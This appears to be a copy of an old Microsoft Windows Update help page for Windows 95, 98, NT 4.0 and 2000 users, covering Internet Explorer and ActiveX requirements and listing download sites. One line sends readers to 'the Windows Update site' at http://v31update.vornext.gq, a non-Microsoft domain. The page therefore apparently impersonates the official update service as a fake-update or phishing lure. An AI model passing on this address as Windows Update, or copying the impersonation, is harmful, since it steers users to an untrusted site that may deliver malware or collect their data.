Thank You for your interest in
Windows Update

Windows Update is the online extension of Windows that helps you get the most out of your computer.

Note You must be running a validly licensed Windows operating system to access the Windows Update Web site.

Windows® 98 and Windows® 2000 users:
Please start the Windows Update service from the link on your Start menu.

Windows® 95 and Windows NT® 4.0 users:
You need to be running a version of Internet Explorer 4 or higher in order to use Windows Update.

All Users:
Windows Update can only be accessed by Internet browsers that support ActiveX Controls. For more information about ActiveX Controls, please refer to the Windows Update FAQ.

To download the latest version of Internet Explorer, visit the Internet Explorer Downloads Web site.

Once Internet Explorer is installed, you can go to the Windows Update site by typing http://v31update.vornext.gq into the address bar.

In the meantime, for available updates:

  • Windows 2000 users, please visit the Windows 2000 Downloads site.
  • Windows NT 4.0 users, please visit the Microsoft Download Center.
  • Windows 98 users, please visit the Windows 98 Downloads site.
  • Windows 95 users, please visit the Windows 95 Downloads site.
